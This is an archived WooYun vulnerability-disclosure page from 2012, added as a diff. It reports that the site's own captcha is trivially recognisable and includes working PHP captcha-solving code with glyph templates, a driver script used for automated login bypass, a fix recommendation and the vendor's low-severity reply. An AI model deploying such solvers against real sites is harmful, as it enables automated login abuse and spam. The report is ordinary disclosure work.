@@ -1,0 +1,470 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		乌云官方验证码容易识别的bug  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		乌云官方验证码容易识别的bug  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/l4yn3">l4yn3</a> 
+</li><li>提交时间：		2012-09-25 19:31</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-09-25：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-09-25：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-10-05：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-10-15：	细节向普通白帽子公开<br/>
+									2012-10-25：	细节向实习白帽子公开<br/>
+									2012-11-09：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">乌云官方网站验证码过于简单，用很简单的程序就可以识别出来</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">乌云官方网站验证码过于简单，用很简单的程序就可以识别出来，然后应该可以绕过验证码进行灌水，我只测试了绕过验证码自动登录。<br />
+<br />
+</p><p class="detail"><a href="../images/2518294218345c4363868642bee68d44edb9357a.jpg" target="_blank"><img src="../images/2518294218345c4363868642bee68d44edb9357a.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+特征：<br />
+<br />
+1.四个字符，<br />
+<br />
+2.基本无干扰素。<br />
+<br />
+3.字符的rgb特征分别为（255,255,255）或(0, 0, 0)，根据此特征可识别字符。<br />
+<br />
+4.共涉及字母和数字22个，貌似没有0和O,1和I，可能是怕分不清楚。<br />
+<br />
+5.字符间距各1个像素，很固定。<br />
+<br />
+6.字符宽度8像素，高度10像素，很固定。<br />
+<br />
+7.图片上间距和左间距固定，各为4px和14px,固定不变。<br />
+<br />
+<br />
+<br />
+识别思路：<br />
+<br />
+1.二值化，根据字符的rgb特征分别为（255,255,255）或(0, 0, 0)的特征将字符像素变成1，其他为0.<br />
+<br />
+2.取字模，手机22个验证码字符的二进制字模。<br />
+<br />
+3.和乌云验证码对比，识别验证码。<br />
+<br />
+</p><pre><code>&lt;?php<br />
+/*=============================================================================<br />
+#     FileName: get_word_from_imge.php<br />
+#         Desc: 简单的验证码识别程序<br />
+#       Author: l4yn3<br />
+#     HomePage: http://hi.baidu.com/l4yn3/<br />
+#      Version: 0.0.1<br />
+#   LastChange: 2012-09-25 18:46:32<br />
+#     参考知识: http://blog.csdn.net/ugg/article/details/3953137<br />
+=============================================================================*/<br />
+<br />
+define(&#039;WORD_WIDTH&#039;,8);   //字符宽度<br />
+define(&#039;WORD_HIGHT&#039;,10);  //字符高度<br />
+define(&#039;WORD_SPACING&#039;,1);  //字符间距<br />
+<br />
+<br />
+/**<br />
+ * 乌云官方验证码识别类<br />
+ */<br />
+<br />
+class valite<br />
+{<br />
+	var $data;<br />
+	var $Keys;<br />
+	var $ImagePath;<br />
+	public function setImage($image)<br />
+	{<br />
+		$this-&gt;ImagePath = $image;<br />
+	}<br />
+	<br />
+	public function getHec()<br />
+	{<br />
+		global $sign;<br />
+		$num = ($sign == &quot;black&quot;) ? 0 : 255 * 3;<br />
+		$res = imagecreatefrompng($this-&gt;ImagePath);<br />
+		$size = getimagesize($this-&gt;ImagePath);<br />
+		$data = array();<br />
+		for($i = 0; $i &lt; $size[1]; ++$i)<br />
+		{<br />
+			for($j=0; $j &lt; $size[0]; ++$j)<br />
+			{<br />
+				$rgb = imagecolorat($res,$j,$i);<br />
+				$rgbarray = imagecolorsforindex($res, $rgb);<br />
+				if($rgbarray[&#039;red&#039;] + $rgbarray[&#039;green&#039;] + $rgbarray[&#039;blue&#039;] !== $num)<br />
+				{<br />
+					$data[$i][$j] = 0;<br />
+				}<br />
+				else<br />
+				{<br />
+					$data[$i][$j] = 1;<br />
+				}<br />
+			}<br />
+		}<br />
+		$this-&gt;DataArray = $data;<br />
+		$this-&gt;ImageSize = $size;<br />
+	}<br />
+	<br />
+	public function run()<br />
+	{<br />
+		global $offset_x, $offset_y, $sign;<br />
+		$num = ($sign == &quot;black&quot;) ? 0 : 255 * 3;   //判断是黑色文字还是白色文字<br />
+		$result=&quot;&quot;;<br />
+		$data = array(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);<br />
+		$res = imagecreatefrompng($this-&gt;ImagePath);<br />
+		$size = getimagesize($this-&gt;ImagePath);<br />
+		<br />
+		for($a = 1; $a &lt;= 4; $a++)<br />
+		{<br />
+			$str = &#039;&#039;;<br />
+			for($i = $offset_y; $i &lt; $offset_y + WORD_HIGHT; $i++)<br />
+			{<br />
+				for($j = $offset_x + ($a - 1) * WORD_WIDTH + ($a - 1) * WORD_SPACING; $j &lt; $offset_x + WORD_WIDTH * $a + ($a - 1) * WORD_SPACING; $j++)<br />
+				{<br />
+					$rgb = imagecolorat($res, $j, $i);<br />
+					$rgb_arr = imagecolorsforindex($res, $rgb);<br />
+					$data[$a-1] .= $this-&gt;DataArray[$i][$j];<br />
+				}<br />
+			}<br />
+		}<br />
+		<br />
+		// 进行关键字匹配<br />
+		foreach($data as $numKey =&gt; $numString)<br />
+		{<br />
+			$max = 0.0;<br />
+			$num = 0;<br />
+			foreach($this-&gt;Keys as $key =&gt; $value)<br />
+			{<br />
+				$percent = 0.0;<br />
+				similar_text($value, $numString,$percent);  //判断字符的相似度<br />
+				if(intval($percent) &gt; $max)<br />
+				{<br />
+					$max = $percent;<br />
+					$num = $key;<br />
+					if(intval($percent) == 100)<br />
+					break;<br />
+				}<br />
+			}<br />
+			$result.=$num;<br />
+		}<br />
+		$this-&gt;data = $result;<br />
+		return $result;<br />
+	}<br />
+	public function __construct()<br />
+	{<br />
+		/*识别出来的乌云验证码字模信息*/<br />
+		$this-&gt;Keys = array(<br />
+		&#039;0&#039;=&gt;&#039;&#039;,<br />
+		&#039;1&#039;=&gt;&#039;&#039;,<br />
+		&#039;2&#039;=&gt;&#039;00111100011001101100001100000011000001100000110000011000001100000110000011111111&#039;,<br />
+		&#039;3&#039;=&gt;&#039;01111100110001100000001100000110000111000000011000000011000000111100011001111100&#039;,<br />
+		&#039;4&#039;=&gt;&#039;00000110000011100001111000110110011001101100011011111111000001100000011000000110&#039;,<br />
+		&#039;5&#039;=&gt;&#039;11111110110000001100000011011100111001100000001100000011110000110110011000111100&#039;,<br />
+		&#039;6&#039;=&gt;&#039;00111100011001101100001011000000110111001110011011000011110000110110011000111100&#039;,<br />
+		&#039;7&#039;=&gt;&#039;11111111000000110000001100000110000011000001100000110000011000001100000011000000&#039;,<br />
+		&#039;8&#039;=&gt;&#039;00111100011001101100001101100110001111000110011011000011110000110110011000111100&#039;,<br />
+		&#039;9&#039;=&gt;&#039;00111100011001101100001111000011011001110011101100000011010000110110011000111100&#039;,<br />
+		&#039;A&#039;=&gt;&#039;00011000001111000110011011000011110000111100001111111111110000111100001111000011&#039;,<br />
+		&#039;B&#039;=&gt;&#039;11111100110001101100001111000110111111001100011011000011110000111100011011111100&#039;,<br />
+		&#039;C&#039;=&gt;&#039;00111110011000111100000111000000110000001100000011000000110000010110001100111110&#039;,<br />
+		&#039;D&#039;=&gt;&#039;11111100110001101100001111000011110000111100001111000011110000111100011011111100&#039;,<br />
+		&#039;E&#039;=&gt;&#039;11111110110000001100000011000000111111001100000011000000110000001100000011111110&#039;,<br />
+		&#039;F&#039;=&gt;&#039;11111111110000001100000011000000111111001100000011000000110000001100000011000000&#039;,<br />
+		&#039;G&#039;=&gt;&#039;00111110011000111100000011000000110000001100011111000011110000110110001100111110&#039;,<br />
+		&#039;H&#039;=&gt;&#039;11000011110000111100001111000011111111111100001111000011110000111100001111000011&#039;,<br />
+		&#039;I&#039;=&gt;&#039;&#039;,<br />
+		&#039;J&#039;=&gt;&#039;00011110000001100000011000000110000001100000011000000110010001100110110000111000&#039;,<br />
+		&#039;K&#039;=&gt;&#039;11000011110001101100110011011000111100001111000011011000110011001100011011000011&#039;,<br />
+		&#039;L&#039;=&gt;&#039;11000000110000001100000011000000110000001100000011000000110000001100000011111110&#039;,<br />
+		&#039;M&#039;=&gt;&#039;11000011111001111111111111011011110110111101101111000011110000111100001111000011&#039;,<br />
+		&#039;N&#039;=&gt;&#039;11000011111000111111001111110011110110111101101111001111110001111100011111000011&#039;,<br />
+		&#039;O&#039;=&gt;&#039;&#039;,<br />
+		&#039;P&#039;=&gt;&#039;11111110110000111100001111000011111111101100000011000000110000001100000011000000&#039;,<br />
+		&#039;Q&#039;=&gt;&#039;00111100011001101100001111000011110000111100001111011011110011110110011000111101&#039;,<br />
+		&#039;R&#039;=&gt;&#039;11111110110000111100001111000011111111101111100011001100110001101100001111000011&#039;,<br />
+		&#039;S&#039;=&gt;&#039;01111110110000111100000011000000011111100000001100000011000000111100001101111110&#039;,<br />
+		&#039;T&#039;=&gt;&#039;11111111000110000001100000011000000110000001100000011000000110000001100000011000&#039;,<br />
+		&#039;U&#039;=&gt;&#039;11000011110000111100001111000011110000111100001111000011110000110110011000111100&#039;,<br />
+		&#039;V&#039;=&gt;&#039;11000011110000111100001101100110011001100110011000111100001111000001100000011000&#039;,<br />
+		&#039;W&#039;=&gt;&#039;11000011110000111100001111000011110110111101101111011011111111111110011111000011&#039;,<br />
+		&#039;X&#039;=&gt;&#039;11000011110000110110011000111100000110000001100000111100011001101100001111000011&#039;,<br />
+		&#039;Y&#039;=&gt;&#039;11000011110000110110011000111100000110000001100000011000000110000001100000011000&#039;,<br />
+		&#039;Z&#039;=&gt;&#039;11111110000001100000011000001100000110000011000001100000110000001100000011111110&#039;,<br />
+	);<br />
+	}<br />
+}<br />
+<br />
+/**<br />
+ *<br />
+ * 此函数用于获得字符特征值，即获取验证码的特征值<br />
+ */<br />
+function getOffSetX($img)<br />
+{<br />
+	global $offset_x, $offset_y, $sign;<br />
+	$res = imagecreatefrompng($img);<br />
+	$size = getimagesize($img);<br />
+	for($a = 1; $a &lt;= 4; $a++)<br />
+	{<br />
+		$str = &#039;&#039;;<br />
+		for($i = $offset_y; $i &lt; $offset_y + WORD_HIGHT; $i++)<br />
+		{<br />
+			for($j = $offset_x + ($a - 1) * WORD_WIDTH + ($a - 1) * WORD_SPACING; $j &lt; $offset_x + WORD_WIDTH * $a + ($a - 1) * WORD_SPACING; $j++)<br />
+			{<br />
+				$rgb = imagecolorat($res, $j, $i);<br />
+				$rgb_arr = imagecolorsforindex($res, $rgb);<br />
+				$num = ($sign == &quot;black&quot;) ? 0 : 255 * 3;<br />
+				if($rgb_arr[&#039;red&#039;] + $rgb_arr[&#039;green&#039;] + $rgb_arr[&#039;blue&#039;] != $num)<br />
+				{<br />
+					$str .= &#039;0&#039;;	<br />
+				}<br />
+				else<br />
+				{<br />
+					$str .= &#039;1&#039;;<br />
+				}<br />
+			}<br />
+		}<br />
+		return $str;<br />
+	}<br />
+	return $str;<br />
+}<br />
+<br />
+/**<br />
+ * 判断是黑色文字 还是白色文字 乌云两种颜色验证码，黑字和白字<br />
+ */<br />
+function checkBOrW($img)<br />
+{<br />
+	$res = imagecreatefrompng($img);<br />
+	$size = getimagesize($img);<br />
+	$str = &quot;&quot;;<br />
+	for($i = 0; $i &lt; $size[1]; $i++)<br />
+	{<br />
+		for($j = 0; $j &lt; $size[0]; $j++)<br />
+		{<br />
+			$rgb = imagecolorat($res, $j, $i);<br />
+			$rgb_arr = imagecolorsforindex($res, $rgb);<br />
+			$str .= $rgb_arr[&quot;green&quot;].$rgb_arr[&quot;red&quot;].$rgb_arr[&quot;blue&quot;];<br />
+		}<br />
+	}<br />
+	if(preg_match(&quot;/(255){3}/&quot;, $str))<br />
+	{<br />
+		return &quot;white&quot;;  //白色文字<br />
+	}<br />
+	else<br />
+	{<br />
+		return &#039;black&#039;;  //黑色文字<br />
+	}<br />
+}<br />
+<br />
+/**<br />
+ * 获取offset_x和offset_y<br />
+ */<br />
+function getOffSet($img = &#039;&#039;)<br />
+{<br />
+	global $sign;<br />
+	$num = ($sign == &quot;black&quot;) ? 0 : 255 * 3;   //判断是黑色文字还是白色文字<br />
+	$res = imagecreatefrompng($img);<br />
+	$size = getimagesize($img);<br />
+	$offset_x = &#039;&#039;;<br />
+	$offset_y = &#039;&#039;;<br />
+	for($i = 1; $i &lt; $size[0]; $i++)<br />
+	{<br />
+		for($j = 1; $j &lt; $size[1]; $j++)<br />
+		{<br />
+			$rgb = imagecolorat($res, $i, $j);<br />
+			$rgb_arr = imagecolorsforindex($res, $rgb);<br />
+			if($rgb_arr[&#039;red&#039;] + $rgb_arr[&#039;green&#039;] + $rgb_arr[&#039;blue&#039;] == $num)<br />
+			{<br />
+				$offset_x = $i;<br />
+				break;<br />
+			}<br />
+		}<br />
+		if($offset_x)<br />
+		{<br />
+			break;<br />
+		}<br />
+	}<br />
+	for($i = 1; $i &lt; $size[1]; $i++)<br />
+	{<br />
+		for($j = 1; $j &lt; $size[0]; $j++)<br />
+		{<br />
+			$rgb = imagecolorat($res, $j, $i);<br />
+			$rgb_arr = imagecolorsforindex($res, $rgb);<br />
+			if($rgb_arr[&#039;red&#039;] + $rgb_arr[&#039;green&#039;] + $rgb_arr[&#039;blue&#039;] == $num)<br />
+			{<br />
+				$offset_y = $i;<br />
+				break;<br />
+			}<br />
+		}<br />
+		if($offset_y)<br />
+		{<br />
+			break;<br />
+		}<br />
+	}<br />
+	return array(&#039;offset_x&#039;=&gt;$offset_x, &#039;offset_y&#039;=&gt;$offset_y);<br />
+}</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>&lt;?php<br />
+include(&quot;get_word_from_imge.php&quot;);<br />
+<br />
+$img = &quot;http://www.wooyun.org/captcha.php&quot;;   //验证码图片名称<br />
+<br />
+$content = get_remove_content($img);<br />
+file_put_contents(&quot;hi.png&quot;, $content);<br />
+<br />
+$img = &quot;hi.png&quot;;<br />
+<br />
+$sign = checkBOrW($img);<br />
+$offset_arr = getOffSet($img);print_r($offset_arr);exit;<br />
+extract($offset_arr);<br />
+//getOffSetX($img);  //获取特征值<br />
+<br />
+$valite = new valite();<br />
+$valite-&gt;setImage($img);<br />
+$valite-&gt;getHec();<br />
+$result = $valite-&gt;run();<br />
+echo $result;</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/2518443057a141370b0965379f25f2c982d7ef9b.jpg" target="_blank"><img src="../images/2518443057a141370b0965379f25f2c982d7ef9b.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/251845175e1bf5dec40006b4684957e827d9a551.jpg" target="_blank"><img src="../images/251845175e1bf5dec40006b4684957e827d9a551.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">使验证码不规则化，增加更复杂的干扰素，减少可识别固定特征（比如字符间距，文字距离图片间距）。其他各种干扰方式。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/l4yn3" title="l4yn3">l4yn3</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-012722" title="乌云官方验证码容易识别的bug">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：2 </p>
+													<p class="detail">确认时间：2012-09-25 19:32</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢作者详细的提交，内容非常丰富，但是这个问题我们认为我们可能不会修复 ：）</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="12722";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
